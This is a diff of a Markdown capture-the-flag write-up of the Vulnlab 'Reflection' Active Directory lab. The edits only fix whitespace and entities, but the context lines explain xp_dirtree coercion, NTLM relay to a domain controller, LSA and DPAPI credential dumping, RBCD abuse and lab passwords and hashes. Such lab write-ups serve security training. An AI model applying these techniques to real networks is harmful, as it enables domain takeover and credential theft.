@@ -55,9 +55,9 @@ smb2-security-mode:
 
 Okay so let me tell you what jumped out immediately. Three things:
 
-First  **SMB signing is disabled on ALL THREE machines, including the domain controller.** This is huge. By default, domain controllers have SMB signing enforced. Someone explicitly turned this off, or just never configured it properly. What this means in practice  if I can get ANY machine on this network to authenticate to me over SMB, I don't need to crack the password. I can just forward that authentication to another machine and that machine will let me in. This is called NTLM relay and it's one of the most devastating attacks in AD environments. The fact that even DC01 has this misconfigured means we can potentially relay auth directly to the domain controller.
+First **SMB signing is disabled on ALL THREE machines, including the domain controller.** This is huge. By default, domain controllers have SMB signing enforced. Someone explicitly turned this off, or just never configured it properly. What this means in practice if I can get ANY machine on this network to authenticate to me over SMB, I don't need to crack the password. I can just forward that authentication to another machine and that machine will let me in. This is called NTLM relay and it's one of the most devastating attacks in AD environments. The fact that even DC01 has this misconfigured means we can potentially relay auth directly to the domain controller.
 
-Second  **MSSQL is running on both DC01 AND MS01 on port 1433.** Having a database server on a domain controller is already a red flag. These two facts together  MSSQL and disabled SMB signing  screamed relay attack to me before I even touched anything.
+Second **MSSQL is running on both DC01 AND MS01 on port 1433.** Having a database server on a domain controller is already a red flag. These two facts together MSSQL and disabled SMB signing screamed relay attack to me before I even touched anything.
 
 Third WS01 has no MSSQL, no WinRM, just SMB and RDP. It's probably an end-user workstation. We'll get to it later.
 
@@ -108,7 +108,7 @@ SMB  10.10.145.182  445  MS01  staging       READ          staging environment
 SMB  WS01  [-] reflection.vl\: STATUS_ACCESS_DENIED
 ```
 
-MS01 has a share called `staging` that anyone can read with no credentials. The comment literally says "staging environment"  this is a development/test setup that got left exposed. This is incredibly common in real organizations. Dev teams spin up staging environments to test things and they never lock them down properly because "it's just for testing." Except the machine is sitting on the same network as production.
+MS01 has a share called `staging` that anyone can read with no credentials. The comment literally says "staging environment" this is a development/test setup that got left exposed. This is incredibly common in real organizations. Dev teams spin up staging environments to test things and they never lock them down properly because "it's just for testing." Except the machine is sitting on the same network as production.
 
 ```
 ┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
@@ -144,7 +144,7 @@ We have `web_staging:Washroom510`. MS01 has MSSQL running. Connect.
 
 ***
 
-## MSSQL on MS01 -  Staging Database
+## MSSQL on MS01 - Staging Database
 
 ```
 ┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
@@ -208,13 +208,13 @@ SQL (web_staging  dbo@staging)> EXEC xp_cmdshell 'whoami';
 turned off as part of the security configuration for this server.
 ```
 
-Disabled. Expected. But MSSQL has another trick  `xp_dirtree`.
+Disabled. Expected. But MSSQL has another trick `xp_dirtree`.
 
 ***
 
 ### xp\_dirtree - Forcing the Server to Authenticate to Us
 
-Here's how this works and why it matters. `xp_dirtree` is a stored procedure that lists the contents of a directory. The interesting thing is it also works with UNC paths  network paths like `\\someserver\share`. When Windows tries to access a network path, it automatically does NTLM authentication. It sends the credentials of whatever user is running the process.
+Here's how this works and why it matters. `xp_dirtree` is a stored procedure that lists the contents of a directory. The interesting thing is it also works with UNC paths network paths like `\\someserver\share`. When Windows tries to access a network path, it automatically does NTLM authentication. It sends the credentials of whatever user is running the process.
 
 So if I run `xp_dirtree '\\my-ip\anything'`, the MSSQL server will try to connect to MY machine over SMB, and in doing so it will send me the NTLMv2 hash of the service account running MSSQL. I can either try to crack that hash, or since SMB signing is disabled everywhere relay it directly to another machine.
 
@@ -257,17 +257,17 @@ Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
 Session completed.
 ```
 
-Nothing. Password isn't in rockyou. Most people get stuck here. But remember  SMB signing is disabled everywhere. We don't need to crack the hash. We can just relay it.
+Nothing. Password isn't in rockyou. Most people get stuck here. But remember SMB signing is disabled everywhere. We don't need to crack the hash. We can just relay it.
 
 ***
 
-## NTLM Relay Attack&#x20;
+## NTLM Relay Attack
 
 ### Getting Into DC01's File Shares
 
 Let me explain this attack properly because it's the heart of this chain.
 
-NTLM authentication works like a challenge-response thing. Server sends you a challenge, you encrypt it with your password hash, send it back, server verifies. The problem is  if you're a man in the middle, you can intercept that challenge-response conversation and forward it to a completely different server. That other server will think you are the original user and let you in.
+NTLM authentication works like a challenge-response thing. Server sends you a challenge, you encrypt it with your password hash, send it back, server verifies. The problem is if you're a man in the middle, you can intercept that challenge-response conversation and forward it to a completely different server. That other server will think you are the original user and let you in.
 
 The only protection against this is SMB signing. With signing enabled, every message is cryptographically signed so the server can verify the message actually came from who it claims. With signing disabled, there's no verification. We can take `svc_web_staging`'s authentication and replay it anywhere on the network.
 
@@ -369,7 +369,7 @@ Production database credentials. `web_prod:Tribesman201`. The DC is running MSSQ
 
 ***
 
-## MSSQL on DC01&#x20;
+## MSSQL on DC01
 
 ### Production Database Has Real User Credentials
 
@@ -428,7 +428,7 @@ Both valid. We now have two domain user accounts. Time to map the entire domain.
 
 ***
 
-## BloodHound&#x20;
+## BloodHound
 
 ### Mapping the Domain
 
@@ -484,7 +484,7 @@ There it is. MS01's local administrator password is `H447.++h6g5}xi`. The `(Pwn3
 
 ***
 
-## MS01&#x20;
+## MS01
 
 ### Getting In and Dumping Everything
 
@@ -530,7 +530,7 @@ REFLECTION\svc_web_staging:DivinelyPacifism98     <-- plaintext password
 
 Two important things came out of this:
 
-`MS01$` machine account NT hash: `0e00baa16b0f4b6bb9d66e8695dbce8e`  this is the computer account for MS01. Computer accounts have SPNs (Service Principal Names) registered to them, which makes them usable for Kerberos delegation attacks. We'll need this for RBCD later.
+`MS01$` machine account NT hash: `0e00baa16b0f4b6bb9d66e8695dbce8e` this is the computer account for MS01. Computer accounts have SPNs (Service Principal Names) registered to them, which makes them usable for Kerberos delegation attacks. We'll need this for RBCD later.
 
 `svc_web_staging` plaintext password: `DivinelyPacifism98` the MSSQL service account password is stored in LSA secrets because the MSSQL service runs as that account and Windows needs to store the credentials to start the service. Another alternative RBCD path with this.
 
@@ -538,7 +538,7 @@ But what about `Georgia.Price`? We see a cached login but no plaintext. She's lo
 
 ***
 
-## DPAPI&#x20;
+## DPAPI
 
 ### Harvesting Credentials From the Windows Vault
 
@@ -571,7 +571,7 @@ Same pattern as before. But WS01 doesn't have LAPS configured, so we can't just 
 
 ***
 
-## WS01&#x20;
+## WS01
 
 ### Resource-Based Constrained Delegation (RBCD) Attack
 
@@ -669,7 +669,7 @@ Second flag down.
 
 ***
 
-## DC01&#x20;
+## DC01
 
 ### Credential Reuse Gets Us Domain Admin
 
@@ -706,11 +706,11 @@ Full domain compromise. Third flag on the DC.
 
 ***
 
-## Alternative Path 1&#x20;
+## Alternative Path 1
 
 ### RBCD Using svc\_web\_staging Instead of MS01$
 
-There's a cleaner route that avoids needing the MS01$ hash. Remember `svc_web_staging` has an SPN (`MSSQL/ms01.reflection.vl`)  that means it qualifies as a delegation principal just like a machine account. And we got its plaintext password from LSA secrets: `DivinelyPacifism98`.
+There's a cleaner route that avoids needing the MS01$ hash. Remember `svc_web_staging` has an SPN (`MSSQL/ms01.reflection.vl`) that means it qualifies as a delegation principal just like a machine account. And we got its plaintext password from LSA secrets: `DivinelyPacifism98`.
 
 With Georgia's GenericAll over WS01 we can put `svc_web_staging` in the delegation attribute instead:
 
@@ -747,7 +747,7 @@ Since `dom_rgarner` is a domain admin, secretsdump works on WS01 and we skip the
 
 ***
 
-## Alternative Path 2 &#x20;
+## Alternative Path 2
 
 ### CVE-2025-33073 DNS + NTLM Reflection
 
@@ -886,4 +886,4 @@ Domain Admin via Credential Reuse
 | CVE-2025-33073 DNS + NTLM Reflection (bonus) | DNS injection + PetitPotam coerce -> DC SAM dump      |
 | DPAPI Masterkey Decryption                   | nxc --dpapi for credential vault harvesting           |
 
-<figure><img src="../../.gitbook/assets/complete (40).gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
